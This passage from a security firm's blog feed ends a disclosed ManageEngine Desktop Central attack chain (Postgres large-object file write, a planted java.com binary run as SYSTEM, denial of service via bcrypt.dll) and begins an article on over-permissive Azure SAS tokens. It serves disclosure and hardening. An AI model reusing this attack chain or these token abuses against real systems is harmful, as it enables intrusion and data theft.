&lt;p&gt;Once arbitrary read / write was confirmed, the attacker was required to know the file name before it can be used with lo_import and moved with lo_export.  Next, we analysed what is loaded at service start and stop time to see if this could be abused to execute code leveraging the arbitrary file write. Surprisingly, the service attempted to load the java.com binary at service start and stop time.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/pasted-image-0-2-2.png&#34; alt=&#34;pasted image 0 2 2&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;By placing a binary here and getting the service to stop and start we were able to achieve code execution. But, we still had the problem of being able to load a malicious file into large objects using lo_import.&lt;/p&gt;
&lt;p&gt;It was apparent that UNC paths could be used to load a malicious file into large objects. If an attacker can host a SMB server on the same network as the MEDC server, we can use lo_import to pull an exe from the SMB server and write it to a location of our choosing. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/pasted-image-0-11.png&#34; alt=&#34;pasted image 0 11&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2022-24-01-13-22-172421-MEDC.png&#34; alt=&#34;2022 24 01 13 22 172421 MEDC&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2022-22-01-13-22-172210-MEDC.png&#34; alt=&#34;2022 22 01 13 22 172210 MEDC&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/pasted-image-0-10.png&#34; alt=&#34;pasted image 0 10&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;h2&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;summary-1&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#summary-1&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;To recap, by this point we had achieved arbitrary file write as NT AUTHORITY SYSTEM, and had identified a binary that was loaded at boot time and whenever the service stops or starts. The j_ava.com_ binary was missing within the default standard build of MEDC.&lt;/p&gt;
&lt;p&gt;Whilst not finding a way to directly trigger the service start and stop using the MEDC portal, it was trivial to cause denial of service (DoS) on the platform by writing the file &lt;em&gt;bcrypt.dll&lt;/em&gt; to the postgres bin directory. This completely kills the web portal and instructs an administrator to reboot the service (the service won&amp;rsquo;t start again until that file has been removed, so this can be incredibly tough for an administrator to unpick). Then once the administrator restarts the service, the java.com binary will be executed as SYSTEM.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2022-28-01-13-22-172801-MEDC.png&#34; alt=&#34;2022 28 01 13 22 172801 MEDC&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2022-28-01-13-22-172814-MEDC.png&#34; alt=&#34;2022 28 01 13 22 172814 MEDC&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/pasted-image-0-13.png&#34; alt=&#34;pasted image 0 13&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/pasted-image-0-14.png&#34; alt=&#34;pasted image 0 14&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;JUMPSEC stopped the attack path here and reported this issue to Managed Engine (Zoho). &lt;/p&gt;
&lt;p&gt;The issue was quickly addressed by Managed Engine. While the patch does not cover all aspects of this attack chain, it addresses the root cause by removing the dcuser from the superadmins postgres group. Therefore server-side queries cannot be used to load large objects. The service is still running as SYSTEM, the java.com binary is still missing on service start and stop and the bcrypt.dll still kills the entire service.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Azure - Securing Shared Access Signatures (SAS)</title>
      <link>//localhost:1313/articles/2022/07/2022-07-14-azure-securing-shared-access-signatures-sas/</link>
      <pubDate>Thu, 14 Jul 2022 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2022/07/2022-07-14-azure-securing-shared-access-signatures-sas/</guid>
      <description>
        
        
        &lt;p&gt;Tom Ellson - Head of Offensive Security&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Summary / TLDR;&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;During a recent client security assessment I came across a number of insecure Azure Storage Accounts. On delivery of the recommendations, it struck me that the client was somewhat unaware of the risks associated with their Azure Storage Accounts. Despite that, the client had a multi-cloud policy and had correctly deployed Amazon S3 buckets elsewhere in their network.&lt;/p&gt;
&lt;p&gt;This blog post is designed to raise awareness of the risks posed by insecure Azure Storage Accounts, analysing the features most interesting to an attacker in terms of exploitable functionality that may be introduced by misconfiguration. It is not intended to be exhaustive and should be used as an accompaniment to existing guidance released by Microsoft. &lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Background&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;background&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#background&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Insecure storage accounts have dominated the headlines for all the wrong reasons over the last couple of years, particularly when related to cloud services. Misconfiguration of Amazon S3 storage buckets, for example, has been identified as one of the most commonly exploited security issues for users of cloud services.&lt;/p&gt;
&lt;p&gt;As a result, last year Amazon updated the default configurations of S3 buckets to be private and accessed only by users explicitly granted access, in addition to producing revised best practice guidance on how to secure them effectively. However, this only applies to newly deployed services, meaning previously deployed instances continue to be vulnerable where they had been deployed with insecure configurations. &lt;/p&gt;
&lt;p&gt;Azure Storage Accounts are the Microsoft equivalent of Amazon S3 buckets, and are susceptible to many of the same challenges. Namely, that (as with other cloud services) they are often deployed by teams without the security know-how to configure them effectively, and that default deployments will often lack the necessary level of controls for their environment unless they are explicitly enabled by the IT team.  &lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Client Environment&lt;/strong&gt; &lt;strong&gt;Overview&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;client-environment-overview&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#client-environment-overview&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The application was deployed successfully in Azure and was making use of Azure file storage accounts containers and blob storage. There was a javascript file being loaded - lets call it &lt;strong&gt;main.js&lt;/strong&gt;. &lt;strong&gt;Main.js&lt;/strong&gt; contained several interesting looking &lt;em&gt;core.windows.net&lt;/em&gt; domain names.&lt;/p&gt;
&lt;p&gt;Further to this, the js file also contained the SAS tokens required to access the resource. The SAS tokens were being used to access resources in the front end, rather than hard coding the access token in the backend and creating a front end function to access the resource through an endpoint or parameter. The SAS tokens were set with an excessive lifetime and granted full permissions on the containers, blobs and file shares. &lt;/p&gt;
&lt;p&gt;Here&amp;rsquo;s an example:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://jstest20.blob.core.windows.net/fd81344e-e9c1-4bfa-b64f-9e6380aea347?comp=list&amp;amp;sv=2019-12-12&amp;amp;ss=bfqt&amp;amp;srt=sco&amp;amp;sp=rwdlacupx&amp;amp;se=2020-07-31T03:41:59Z&amp;amp;st=2020-07-30T19:41:59Z&amp;amp;spr=https&amp;amp;sig=REDACTED&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://jstest20.blob.core.windows.net/fd81344e-e9c1-4bfa-b64f-9e6380aea347**?comp=list**&amp;amp;sv=2019-12-12&amp;amp;ss=bfqt&amp;amp;srt=sco&amp;amp;sp=rwdlacupx&amp;amp;se=2020-07-31T03:41:59Z&amp;amp;st=2020-07-30T19:41:59Z&amp;amp;spr=https&amp;amp;sig=REDACTED&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This immediately jumped out as a risk, because from here we were able to traverse the blob containers and file share containers to gain access to sensitive information without even having to authenticate to the application, as the .js file was loaded as the page was rendered.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Attack Path Analysis&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;attack-path-analysis&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#attack-path-analysis&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The following graphic demonstrates the attack path in which a threat actor would move from compromising the web organisation whilst only making a single request to the web application.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/Azure_Storage-new03-2-1024x387.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Attack Surface&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;attack-surface&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#attack-surface&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;As an attacker, the most interesting and exploitable functions I would look for would be regarding the information that can be used to further gain access to an environment or corporate data. In the example graphic, the attacker gained access to the corporate on premise environment whilst only making a single request to the main.js file on the web server.&lt;/p&gt;
&lt;p&gt;The lack of segregation plays a part in the compromise of enterprise resources. The file share that is used as a development storage account, is also used to store corporate documentation and configuration files that can be used to facilitate an on-premise connection.&lt;/p&gt;
&lt;p&gt;Traditional methods of container compromise include being able to access the resources without authentication, or an AWS or Azure administrator unintentionally allowing public access to cloud storage. This is made difficult due to the amount of warnings that are in place to help educate the user on what they are about to expose themselves to. &lt;/p&gt;
&lt;p&gt;Azure Storage Accounts compromise could enable an attacker to host a malicious website, pose as a legitimate business or initiate a watering hole attack - thereby poisoning legitimate users&amp;rsquo; traffic.&lt;/p&gt;
&lt;p&gt;Examples of real work applications of misconfigured storage accounts include the usage of Azure File Storage accounts being used to host content for job postings - e.g. where an administrator who has provisioned access has used a SAS token within the front end rather than using an account token in the backend and wrapping a client side function around it.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Storage Account Overview&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;storage-account-overview&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#storage-account-overview&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;First, let’s take a look at storage accounts and the function they perform. In essence, users (either solo or part of an Azure AD tenant) can create storage accounts within Azure resources; these storage accounts can be used as object storage within the cloud.&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;The Azure storage account contains all Azure storage that being blobs, containers, queues, tables, and disks. When spinning up a storage account the name of the storage account has to remain unique as it will be a namespace for your Azure storage data. In some cases, this data is accessible over the public internet (more on that later). &lt;/p&gt;
&lt;p&gt;The schema takes the following approach when deploying storage:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://jstest20.blob.core.windows.net/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://jstest20.blob.core.windows.net/&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://jstest20.file.core.windows.net/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://jstest20.file.core.windows.net/&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://jstest20.queue.core.windows.net/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://jstest20.queue.core.windows.net/&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://jstest20.table.core.windows.net/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://jstest20.table.core.windows.net/&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://jstest20.dfs.core.windows.net/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://jstest20.dfs.core.windows.net/&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://jstest20.z13.web.core.windows.net/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://jstest20.z13.web.core.windows.net/&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;File shares can also be set up in the Azure storage accounts to access resources over SMBv3 (port 445), and using an account key to authenticate and mount the share locally. &lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Shared Access Tokens (SAS)&lt;/strong&gt; &lt;span class=&#34;absolute -mt-20&#34; id=&#34;shared-access-tokens-sas&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#shared-access-tokens-sas&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Microsoft defines three types of SAS: &lt;em&gt;Service SAS, Account-level SAS&lt;/em&gt;, and &lt;em&gt;User Delegation SAS&lt;/em&gt;. &lt;/p&gt;
&lt;p&gt;The account-level SAS can provide access to various services present within the storage account, e.g blob, file, etc. providing access to the resource, service level API&amp;rsquo;s, container API’s, object API’s, etc. and gives pretty much free reign on reading, writing and deleting storage account contents. In contrast, the service SAS gives access to just one service within a storage account.&lt;/p&gt;
&lt;h3&gt;Account-Level vs Service-Level &lt;span class=&#34;absolute -mt-20&#34; id=&#34;account-level-vs-service-level&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#account-level-vs-service-level&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The main difference between the three from an attacker perspective is ease of control of the Storage Account. Account-level SAS tokens will grant access to all resources (depending on the SignedResourceTypes (more on this below). Account-level tokens can be used to grant access to all containers, blobs, file shares, queues and tables within the storage account. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image-12.png&#34; alt=&#34;image 12&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;The graphic above demonstrates the difference between Account-level and Service-level SAS tokens. The example shows that an account-level SAS token can be used to access blobs and containers, however if the SignedServices  is over permissive, such as ss=bfqt this will allow the SAS token to be used for all Storage Account services. The SignedResourceTypes is set to sco - allowing the SAS token to be used for service-level, container-level, and object-level API’s.&lt;/p&gt;
&lt;h3&gt;Account-level SAS&lt;span class=&#34;absolute -mt-20&#34; id=&#34;account-level-sas&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#account-level-sas&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;An Account-level SAS was introduced with version &lt;em&gt;2015-04-05&lt;/em&gt;. It delegates access to resources in &lt;strong&gt;one or more&lt;/strong&gt; of the Azure Storage Account services. All of the operations available via a service SAS are also available via an Account-level SAS.&lt;/p&gt;
&lt;p&gt;We aren&amp;rsquo;t going to reinvent the wheel here by explaining all concepts of how SAS tokens work and how they are constructed. In essence, the Account-level SAS can be used to access blobs, containers and other storage account features. The SAS token is made up of the SAS URI, which contains the Storage URI and SAS Token.&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;Storage Resource:&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;storage-resource&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#storage-resource&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;a href=&#34;https://jstest20.blob.core.windows.net/fd81344e-e9c1-4bfa-b64f-9e6380aea347/test.txt&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://jstest20.blob.core.windows.net/fd81344e-e9c1-4bfa-b64f-9e6380aea347/test.txt&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;Account-level SAS Token:&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;account-level-sas-token&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#account-level-sas-token&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;?sv=2019-12-12&amp;amp;ss=bfqt&amp;amp;srt=sco&amp;amp;sp=rwdlacupx&amp;amp;se=2020-07-31T00:09:01Z&amp;amp;st=2020-07-30T16:09:01Z&amp;amp;spr=https&amp;amp;sig=REDACTED&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;Account-level SAS URI:&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;account-level-sas-uri&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#account-level-sas-uri&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;a href=&#34;https://jstest20.blob.core.windows.net/fd81344e-e9c1-4bfa-b64f-9e6380aea347/test.txt?sv=2019-12-12&amp;amp;ss=bfqt&amp;amp;srt=sco&amp;amp;sp=rwdlacupx&amp;amp;se=2020-07-31T00:09:01Z&amp;amp;st=2020-07-30T16:09:01Z&amp;amp;spr=https&amp;amp;sig=REDACTED&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://jstest20.blob.core.windows.net/fd81344e-e9c1-4bfa-b64f-9e6380aea347/test.txt?sv=2019-12-12&amp;ss=bfqt&amp;srt=sco&amp;sp=rwdlacupx&amp;se=2020-07-31T00:09:01Z&amp;st=2020-07-30T16:09:01Z&amp;spr=https&amp;sig=REDACTED&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;There are several parameters that make up Account-level SAS tokens, but for the purpose of this post, 5 will be discussed.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Signature (sig)
&lt;ul&gt;
&lt;li&gt;Sig=XXXX&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SignedExpiry (se):
&lt;ul&gt;
&lt;li&gt;se=2020-07-31&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SignedPermission (sp)
&lt;ul&gt;
&lt;li&gt;sp=rwdlacupx&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SignedServices(ss)
&lt;ul&gt;
&lt;li&gt;ss=bfqt&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SignedResourceTypes (srt)
&lt;ul&gt;
&lt;li&gt;sr=sco&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;strong&gt;Signature&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;signature&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#signature&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;Arguably&lt;/strong&gt;, the most important on this list is the Signature. The signature is used to authorise the request to the endpoint or resource. MFST says &lt;em&gt;“The string-to-sign is a unique string constructed from the fields that must be verified in order to authorize the request. The signature is an HMAC computed over the string-to-sign and key using the SHA256 algorithm, and then encoded using Base64 encoding.”&lt;/em&gt;  &lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;SignedExpiry&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;signedexpiry&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#signedexpiry&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;The SignedExpiry parameter is also important. An extended lifetime means increases the risk of abuse if the SAS token is compromised, as long as it has not been revoked, or the container / resource deleted. It is vital that the expiry time is fit for purpose and valid for the period required. &lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;SignedPermission&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;signedpermission&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#signedpermission&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;SignedPermission defines what permissions are allocated to the SAS token. &lt;strong&gt;&lt;em&gt;rwdlacupx&lt;/em&gt;&lt;/strong&gt;  is the most permissive, and allows for read (r), write (w), delete (d), list (l), add (a), create (c) , update (u), and process (p)&lt;strong&gt;&lt;em&gt;.&lt;/em&gt;&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;When interacting with blobs and file storage, the following permissions are not required in order to gain full control over the containers and file shares.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Add (a)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Update (u)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Process (p)&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;em&gt;More on this can be found here:&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/rest/api/storageservices/create-account-sas&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://docs.microsoft.com/en-us/rest/api/storageservices/create-account-sas&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Just like expiry, it is vital that these permissions are accurate for the client / user trying to access the resource; incorrect configuration of these could lead to data loss and/or compromise.&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;SignedResourcetypes&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;signedresourcetypes&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#signedresourcetypes&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;SignedResourceTypes is another big one. It determines the type of SAS token you possess. For example &lt;em&gt;sr=sco&lt;/em&gt; will give you access to the stated service, object and container APIs. A must for providing external users access to the storage account.&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;SignedServices&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;signedservices&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#signedservices&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Finally SignedServices, in essence, which services the SAS token has access to; blob, queue, file, or table. As you can imagine, these are often heavily over-permissive, with administrators giving out SAS tokens that bear the following privileges: (access to everything).&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;?sv=2019-12-12&amp;amp;ss=bfqt&amp;amp;srt=sco&amp;amp;sp=rwdlacupx&amp;amp;se=2021-07-31T00:31:36Z&amp;amp;st=2020-07-30T16:31:36Z&amp;amp;spr=https&lt;/strong&gt;&lt;/p&gt;
&lt;h3&gt;Service-Level SAS&lt;span class=&#34;absolute -mt-20&#34; id=&#34;service-level-sas&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#service-level-sas&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;A service-level SAS delegates access to resources in just one of the storage services. The services range from blob, Queue, Table or File. Service-level SAS can be granular to blobs, containers and directories&lt;/p&gt;
&lt;p&gt;The service-level SAS can be generated within the Azure portal, but the configuration is limited. Recently Azure released the ability to provide granular permissions or containers in which the depth could be specified, to provide restriction around traversing containers and sub directories.&lt;/p&gt;
&lt;p&gt;The below C# snippet can generate service level SAS tokens and provide granular access to resources, in the below example, the token is granted for read, write and list permissions to the container testfile01 inside the storage account jsteststorage111. This service level SAS is granted on a container level, meaning that any attempts to access any other resources will not work.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://gist.github.com/tdesec/ccb41e4606c1ea83a264bf14d439ed76&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://gist.github.com/tdesec/ccb41e4606c&lt;/a&gt;&lt;a href=&#34;https://gist.github.com/tdesec/ccb41e4606c1ea83a264bf14d439ed76&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;1ea83a264bf14d439ed76&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;GetAdHocContainerSasToken&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;containerName&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;testfile01&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;connectionString&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;DefaultEndpointsProtocol=https;AccountName=jsteststorage111;AccountKey=XXXXXXXXXXXXXXXXXXXXXXX==;EndpointSuffix=core.windows.net&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sasBuilder&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ShareSasBuilder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ShareName&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;containerName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Resource&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;s&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//Value b is for generating token for a Blob and c is for container&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;StartsOn&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DateTime&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;UtcNow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AddMinutes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(-&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
